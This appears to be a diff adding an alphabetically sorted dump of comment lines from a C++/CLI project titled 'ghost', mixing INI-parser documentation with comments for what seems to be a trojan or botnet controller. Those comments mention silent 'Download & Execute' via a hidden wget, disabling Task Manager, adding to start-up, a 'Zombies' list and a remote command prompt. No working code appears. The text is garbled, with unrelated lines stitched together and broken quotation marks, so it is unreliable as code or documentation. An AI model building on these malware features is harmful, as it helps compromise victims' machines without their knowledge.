@@ -1,0 +1,107 @@
+			//TODO: Add the constructor code here"
+		}"
+"//
+"//  nullchar in the BSTR. note: BSTR's support imbedded nullchars,"
+"// ""Download & Execute"""
+"// 64-bit automatically redirected to ""HKLM\SOFTWARE\Wow6432Node"""
+"// Get a boolean value from INI file, returning default_value if not found or if"
+"// Get a real (floating point double) value from INI file, returning"
+"// Get a string value from INI file, returning default_value if not found."
+"// Get an integer (long) value from INI file, returning default_value if"
+"// Null terminating. Without this, there will be gibberish at the end of the data."
+"// Return the result of ini_parse(), i.e., 0 on success, line number of"
+"// This is to prevent this program from closing; but instead, run in the background."
+"// This parses ""1234"" (decimal) and also ""0x4D2"" (hex)"
+"// and valid false values are ""false"", ""no"", ""off"", ""0"" (not case sensitive)."
+"// first error on parse error, or -1 on file open error."
+"// for simplicity here rather than speed, but it should be pretty decent.)"
+"// not a valid true/false value. Valid true values are ""true"", ""yes"", ""on"", ""1"","
+"// not found or not a valid integer (decimal ""1234"", ""-1234"", or hex ""0x4d2"")."
+//      Build Number
+//      Major Version"
+//      Minor Version
+//      Revision
+//  so this will only convert through the first nullchar.
+// </summary>
+// <summary>
+// Adding to start-up since we couldn't use the Shell start-up.
+// Calibrating the console to ahxrlogger (https://github.com/AHXR/ahxrlogger)
+// Callbacks for ahxrwinsock 
+// Clean up any resources being used.
+// Client information and handling
+// Command Prompt
+// Configuration
+// Console thread (ghost gui)
+// Construct INIReader and parse given filename. See ini.h for more info
+// Convert to lower case to make section/name lookups case-insensitive
+// Convert to lower case to make string comparisons case-insensitive
+// Creating a new console host for this application specifically. 
+// Creating the wget file.
+// Data encryption
+// Default Warning
+// Disable Task Manager
+// Download & Execute
+// Exit
+// Fetching the sent data.
+// General Information about an assembly is controlled through the following"
+// Getting the file name.
+// Go to the project home page for more info:
+// HTTP (real_ip)
+// IP and Port;
+// Just the path of the executed location.
+// Loading configuration file and settings.
+// Looking for cmd.exe
+// Macros and further configuration
+// Minimize
+// No admin access. Just make it user startup.
+// No permission
+// Nullifying by using the magical keyword
+// Read an INI file into easy-to-access name/value pairs.
+// Read an INI file into easy-to-access name/value pairs. (Note that I've gone
+// Refresh
+// Remove previous instance.
+// Removing encryption.
+// Required designer variable.
+// Required method for Designer support - do not modify
+// Resource Files
+// Returning a reference to the struct
+// Running the downloaded file and removing wget.exe
+// Running wget.exe in the background. Hiding the command prompt as well. Silent downloading.
+// Safe reset
+// Show Zombies
+// Showing the menu and starting the ghost server.
+// Starting and idling server
+// String to PCSTR (const char *)
+// Summary for gui
+// Temp path for returning cmd response.
+// Testing if socket is active. Will never respond.
+// Toggling Command Prompt response 
+// Tray icon
+// Use _values.find() here instead of _values.at() to support pre C++11 compilers
+// Version information for an assembly consists of the following four values:"
+// Windows functions
+// You can specify all the value or you can default the Revision and Build Numbers"
+// Zombie storage (dll)
+// __INIREADER_H__
+// about the parsing.
+// according to strtod().
+// associated with an assembly.
+// b_skip determines whether the server is doing commands or not.
+// by using the '*' as shown below:
+// conversion with temp.
+// default_value if not found or not a valid floating point value
+// define NULL functionality. I just clear the target.
+// gui
+// https://github.com/AHXR/ahxrlogger
+// https://github.com/AHXR/ahxrwinsocket
+// https://github.com/benhoyt/inih
+// https://github.com/benhoyt/inih"
+// inih and INIReader are released under the New BSD license (see LICENSE.txt).
+// no content. clear target
+// real_ip library
+// request content length in single-chars through a terminating
+// set of attributes. Change these attribute values to modify the information
+// taskbarIcon
+// the contents of this method with the code editor.
+[assembly:AssemblyTitleAttribute(L""#ghost"")];"
+[assembly:AssemblyTitleAttribute(L""ghost"")];"
